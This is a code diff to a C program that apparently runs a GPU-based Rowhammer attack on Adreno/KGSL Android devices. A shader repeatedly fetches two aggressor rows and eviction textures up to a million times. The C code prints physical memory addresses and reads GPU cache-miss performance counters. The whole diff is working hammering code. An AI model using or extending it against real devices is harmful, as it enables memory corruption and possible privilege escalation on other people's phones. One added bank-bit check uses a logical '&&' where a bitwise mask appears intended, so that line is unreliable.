@@ -188,7 +188,7 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"out vec4 val;\n"
 	"void main(){\n"
 	"	//int id = int(threadD.x) % 4;\n"
-	"	for(int i = 0; i < border; i++){\n"
+	"	for(uint i = 0u; i < 1000000u; i++){\n"
 	"		\n"
 	"		val += texelFetch(row1, ivec2( 0, 0), 0); \n "
 	"		 val += texelFetch(row2, ivec2(0,0), 0) ;\n"
@@ -196,15 +196,15 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"		 val += texelFetch(evict1, ivec2(0, 0), 0) ;\n "
 	"		 val += texelFetch(evict7, ivec2(0, 0), 0) ;\n "
 	"		 val += texelFetch(evict2, ivec2(0, 0), 0) ;\n "
-	//"		 val += texelFetch(evict8, ivec2(0, 0), 0) ;\n "
+//	"		 val += texelFetch(evict8, ivec2(0, 0), 0) ;\n "
 	"		 val += texelFetch(evict3, ivec2(0, 0), 0) ;\n "
-	//"		 val += texelFetch(evict9, ivec2(0, 0), 0) ;\n "
+//	"		 val += texelFetch(evict9, ivec2(0, 0), 0) ;\n "
 	"		 val += texelFetch(evict4, ivec2(0, 0), 0) ;\n "
-	//"		 val += texelFetch(evict10, ivec2(0, 0), 0) ;\n "
+//	"		 val += texelFetch(evict10, ivec2(0, 0), 0) ;\n "
 	"		 val += texelFetch(evict5, ivec2(0, 0), 0) ;\n "
 //	"		 val += texelFetch(evict11, ivec2(0, 0), 0) ;\n "
 	"		 val += texelFetch(evict6, ivec2(0, 0), 0) ;\n "
-	//"		 val += texelFetch(evict12, ivec2(0, 0), 0) ;\n "
+//	"		 val += texelFetch(evict12, ivec2(0, 0), 0) ;\n "
 	
 	"		 val += texelFetch(row1, ivec2(0, 2), 0) ;\n "
 	"		 val += texelFetch(row2, ivec2(0, 2), 0) ;\n "
@@ -212,9 +212,9 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"		 val += texelFetch(evict1, ivec2(0, 2), 0) ;\n "
 	"		 val += texelFetch(evict7, ivec2(0, 2), 0) ;\n "
 	"		 val += texelFetch(evict2, ivec2(0, 2), 0) ;\n "
-	//"		 val += texelFetch(evict8, ivec2(0, 2), 0) ;\n "
+//	"		 val += texelFetch(evict8, ivec2(0, 2), 0) ;\n "
 	"		 val += texelFetch(evict3, ivec2(0, 2), 0) ;\n "
-	//"		 val += texelFetch(evict9, ivec2(0, 2), 0) ;\n "
+//	"		 val += texelFetch(evict9, ivec2(0, 2), 0) ;\n "
 	"		 val += texelFetch(evict4, ivec2(0, 2), 0) ;\n "
 //	"		 val += texelFetch(evict10, ivec2(0, 2), 0); \n"
 	"		 val += texelFetch(evict5, ivec2(0, 2), 0); \n"
@@ -605,9 +605,19 @@ int main(){
  
 		for( int k = 0; k < 32; k += 2){
 			// Hammering two rows...
+			GLuint group[2];
+			GLuint counter[3];
+			GLuint monitor;
+			GLuint *counterData;
+			GLuint row1TexLocation, row2TexLocation;
+			unsigned int resultSize;
+			GLuint evictionTexLocation;
+			GLsizei bytesWritten;
+			GLsizei wordCount = 0;
 			unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
 			memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
 			
+			if(((uint64_t)row1->kgsl_pa >> 13 && 0x7) != ((uint64_t)row1->kgsl_next->kgsl_pa >> 13 && 0x7))	goto next_iter;
 			glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
 			glClear(GL_COLOR_BUFFER_BIT);
 			glUseProgram(shaderProgram2);
@@ -615,8 +625,8 @@ int main(){
 			glEnableVertexAttribArray(0);
 			
 			// Binding textures
-			GLuint row1TexLocation = glGetUniformLocation(shaderProgram2, "row1");
-			GLuint row2TexLocation  = glGetUniformLocation(shaderProgram2, "row2");
+			row1TexLocation = glGetUniformLocation(shaderProgram2, "row1");
+			row2TexLocation  = glGetUniformLocation(shaderProgram2, "row2");
 
 			printf("HEY ROW1 IS HERE %p\n", row1->kgsl_pa);
 			printf("HEY ROW2 IS HERE %p\n", row2->kgsl_pa);
@@ -633,7 +643,7 @@ int main(){
 			glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, frame2);
 
 			printf("HEY EVICT1 IS HERE %p : %p\n", evictarr[0]->kgsl_pa, evictarr[0]->kgsl_va);
-			GLuint evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict1");
+			evictionTexLocation  = glGetUniformLocation(shaderProgram2, "evict1");
 			glUniform1i(evictionTexLocation,  2);
 			glActiveTexture(GL_TEXTURE0 + 2); // eviction Texture Unit
 			glBindTexture(GL_TEXTURE_2D, evictarr[0]->kgsl_id);
@@ -721,11 +731,6 @@ int main(){
 			row1TexLocation = glGetUniformLocation(shaderProgram2, "border");;
 			glUniform1i(row1TexLocation, 1000000);			
 			// running the program
-			GLuint group[2];
-			GLuint counter[3];
-			GLuint monitor;
-			GLuint *counterData;
-			unsigned int resultSize;
 			getCounterByName("VBIF", "AXI_READ_REQUESTS_TOTAL", &group[0],&counter[0]);
     			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_REQUESTS", &group[1],&counter[1]);
     			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_MISSES", &group[1],&counter[2]);
@@ -744,11 +749,9 @@ int main(){
         	    		return -1;
 	        	}
 			counterData = (GLuint*) malloc(resultSize);
-			GLsizei bytesWritten;
 			glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_AMD,  resultSize, counterData, &bytesWritten);
 			// printf("COUNTER DATA HAS SIZE OF %lu / %lu\n", bytesWritten, resultSize);
 			// display or log counter info
-			GLsizei wordCount = 0;
 			printf("PERformance counters: ");
 			while ( (4 * wordCount) < bytesWritten ){
 				GLuint groupId = counterData[wordCount];
@@ -796,6 +799,7 @@ int main(){
 			//glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
 			//for(int i = 0; i < 32 * 32; ++i) if(frame2[i] != 0xff000000)printf("FRAMEBUFFER: 0x%x - [%d:%d]\n", frame2[i],  i % 32, i / 32);
 			
+	next_iter:
 			free(frame2);
 			row1 = row1->kgsl_next->kgsl_next;
 			victim = row1;
